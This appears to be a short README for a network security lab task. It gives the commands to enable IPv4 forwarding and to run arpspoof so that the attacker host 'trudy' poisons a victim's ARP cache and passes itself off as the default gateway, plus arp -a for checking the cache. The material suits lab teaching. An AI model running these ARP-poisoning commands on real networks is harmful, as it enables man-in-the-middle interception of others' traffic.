This is the readme for task 4.

### command to enable ipV4 forwarding .
>>sudo sysctl -w net.ipv4.ip_forward=1

### This commands are run by trudy for ARP poisoning, where the trudy changes default gateway address to its own address.
>> arpspoof -i eth0 -t 172.31.0.2 172.31.0.1
>> arpspoof -i eth0 -t 172.31.0.2 172.31.0.1

### Command for alice and bob to chek the ARP cache.
>>arp -a